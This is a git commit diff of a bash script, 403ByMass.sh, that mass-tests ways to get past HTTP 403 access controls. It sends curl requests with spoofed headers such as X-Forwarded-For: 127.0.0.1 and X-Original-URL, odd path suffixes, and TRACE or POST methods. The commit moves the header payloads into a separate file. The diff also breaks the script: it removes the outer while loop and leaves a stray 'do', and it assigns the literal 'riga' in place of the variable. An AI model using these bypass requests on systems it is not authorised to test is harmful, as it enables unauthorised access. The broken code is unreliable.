d10b0f2530570c4e9f4f4036919eab34b35a0a86
DGSGROUP\luca.delvecchio <luca.delvecchio@dgsspa.com>
2024-10-05 15:24:00 +0200

    payload header

--- 403ByMass.sh
+++ 403ByMass.sh
@@ -33,7 +33,8 @@ then
 	outputFile=$3
 fi
 
-while IFS= read -r path;
+filePayload="./payload-custom-header"
+
 do
 
 	echo "Test bypass: $path"
@@ -48,16 +49,6 @@ do
 	echo "  --> ${url}//${path}//"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/./$path/./
 	echo "  --> ${url}/./${path}/./"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $path" $url/$path
-	echo "  --> ${url}/${path} -H X-Original-URL: ${path}"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $url/$path
-	echo "  --> ${url}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $url/$path
-	echo "  --> ${url}/${path} -H X-Forwarded-For: http://127.0.0.1"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $url/$path
-	echo "  --> ${url}/${path} -H X-Forwarded-For: 127.0.0.1:80"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $path" $url
-	echo "  --> ${url} -H X-rewrite-url: ${path}"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%20
 	echo "  --> ${url}/${path}%20"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%09
@@ -70,8 +61,6 @@ do
 	echo "  --> ${url}/${path}/?anything"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path#
 	echo "  --> ${url}/${path}#"
-	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
-	echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/*
 	echo "  --> ${url}/${path}/*"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.php
@@ -80,24 +69,19 @@ do
 	echo "  --> ${url}/${path}.json"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
 	echo "  --> ${url}/${path}  -X TRACE"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $url/$path
-	echo "  --> ${url}/${path} -H X-Host: 127.0.0.1"
 	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$url/$path..;/"
 	echo "  --> ${url}/${path}..;/"
 	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $url/$path;/"
 	echo "  --> ${url}/${path};/"
 	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
 	echo "  --> ${url}/${path} -X TRACE"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $url/$path
-	echo "  --> ${url}/${path} -H X-Forwarded-Host: 127.0.0.1"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $path" $url/$path
-	echo "  --> ${url}/${path} -H Referer: $path"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $url/$path
-	echo "  --> ${url}/${path} -H X-Originating-IP: 127.0.0.1"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Server: $url" $url/$path
-	echo "  --> ${url}/${path} -H X-Forwarded-Server: $url"
-	curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Host-Override: $url" $url/$path
-	echo "  --> ${url}/${path} -H X-HTTP-Host-Override: $url"
+	curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
+	echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
+	while IFS= read -r riga; do
+		payload="riga"
+		curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $payload $url/$path
+		echo "  --> ${url}/${path} $payload"
+	done < $filePayload
 	echo "***************************************************************************************"
 	echo ""
 	echo ""
